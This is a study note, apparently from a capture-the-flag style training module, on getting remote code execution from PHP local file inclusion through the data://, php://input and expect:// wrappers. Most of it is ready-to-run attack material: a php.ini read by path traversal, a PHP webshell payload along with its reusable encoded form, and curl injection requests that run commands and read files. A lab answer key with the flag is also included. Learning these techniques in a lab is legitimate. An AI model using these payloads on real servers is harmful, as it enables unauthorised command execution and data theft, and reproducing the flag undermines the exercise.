## ID
<!-- TODO: assign correct ID from your File Inclusion module range -->

## Module
File Inclusion

## Kind
notes

## Title
Section 5 — PHP Wrappers (RCE via data://, php://input, expect://)

## Description
Achieving remote code execution through LFI using PHP stream wrappers (data, input, expect) when allow_url_include is enabled on the target.

## Tags
lfi, rce, php-wrappers, data-wrapper, webshell, php

## Commands
- curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' | grep "W1BI" | sed 's/ \{12\}//g' | sed 's/<p class="read-more">//g' > configBase64.txt
- cat configBase64.txt | base64 -d | grep 'allow_url_include'
- echo '<?php system($_GET["cmd"]); ?>' | base64
- python3 -c 'import urllib.parse;print(urllib.parse.quote("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'
- curl -s 'http://<TARGET>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=<CMD>' | grep -v "<.*>"
- curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' 'http://<TARGET>/index.php?language=php://input&cmd=id' | grep -v "<.*>"
- curl -s 'http://<TARGET>/index.php?language=expect://id' | grep uid

## What This Section Covers
PHP stream wrappers can be abused through LFI to execute arbitrary commands on the server. The `data://` and `php://input` wrappers require `allow_url_include = On` in `php.ini`. The `expect://` wrapper requires the optional expect extension to be installed. Together, these cover the main paths from LFI to full RCE on PHP backends.

## Methodology
1. **Check allow_url_include** — read `php.ini` via the base64 filter and grep for the setting. Path varies by server: `/etc/php/<VERSION>/apache2/php.ini` (Apache) or `/etc/php/<VERSION>/fpm/php.ini` (Nginx). Try PHP 7.4 first, fall back to earlier versions.
2. **data:// wrapper** (if allow_url_include = On):
   - Base64-encode a PHP webshell: `echo '<?php system($_GET["cmd"]); ?>' | base64`
   - URL-encode the base64 string (especially `+` → `%2B`, `=` → `%3D`)
   - Inject: `?language=data://text/plain;base64,<URL_ENCODED_B64>&cmd=<CMD>`
3. **php://input wrapper** (if allow_url_include = On, and endpoint accepts POST):
   - Send the PHP code as POST body, command as GET param
   - `curl -X POST --data '<?php system($_GET["cmd"]); ?>' '...?language=php://input&cmd=id'`
4. **expect:// wrapper** (if expect extension loaded):
   - Check `php.ini` for `extension=expect`
   - Inject directly: `?language=expect://id`
5. **Find the flag** — run `ls+/` first to list root, then `cat+/<filename>` on anything suspicious.

## Multi-step Workflow

```bash
# Step 1 — grab and check php.ini for allow_url_include
curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' \
  | grep "W1BI" | sed 's/ \{12\}//g' | sed 's/<p class="read-more">//g' > configBase64.txt
cat configBase64.txt | base64 -d | grep 'allow_url_include'

# Step 2 — generate and URL-encode the webshell
echo '<?php system($_GET["cmd"]); ?>' | base64
# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
python3 -c 'import urllib.parse;print(urllib.parse.quote("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'
# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D

# Step 3 — data:// RCE: list root
curl -s 'http://<TARGET>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/' | grep -v "<.*>"

# Step 4 — cat the flag file found in /
curl -s 'http://<TARGET>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat+/<FLAGFILE>.txt' | grep -v "<.*>"

# Alternative — php://input RCE
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  'http://<TARGET>/index.php?language=php://input&cmd=id' | grep -v "<.*>"

# Alternative — expect:// RCE (if extension loaded)
curl -s 'http://<TARGET>/index.php?language=expect://id' | grep uid
```

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Flag at `/` via PHP wrapper RCE | `HTB{d!$46l3_r3m0t3_url_!nclud3}` | `allow_url_include=On` confirmed → data:// webshell → `ls /` → `cat /<hash>.txt` |

## Key Takeaways
- `allow_url_include = On` is not default — always verify via php.ini before attempting data:// or php://input.
- The base64 webshell `PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D` is reusable across targets as long as allow_url_include is on.
- URL-encode the base64 string — the `+` and `=` characters will break the request if left raw.
- `grep -v "<.*>"` cleanly strips HTML noise from curl output, leaving only command output.
- The flag in `/` will often be a random `.txt` filename — always `ls /` first rather than guessing.
- `php://input` is useful when the data:// wrapper is filtered by keyword but POST is accepted.

## Gotchas
- php.ini path changes with PHP version and server type — if `7.4/apache2` returns nothing, try `8.0`, `8.1`, `8.2`, or switch to `fpm`.
- The base64 blob from `php.ini` is very large — don't try to copy-paste manually; save to file with the `grep | sed` pipeline above.
- `expect://` requires the extension to actually load at runtime — `extension=expect` in the config is necessary but not sufficient; test directly.
- Commands with spaces must use `+` (or `%20`) in the URL: `cmd=cat+/etc/passwd`, not `cmd=cat /etc/passwd`.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-inclusion]]  
← [[04-php-filters]] | [[06-rfi]] →
<!-- AUTO-LINKS-END -->
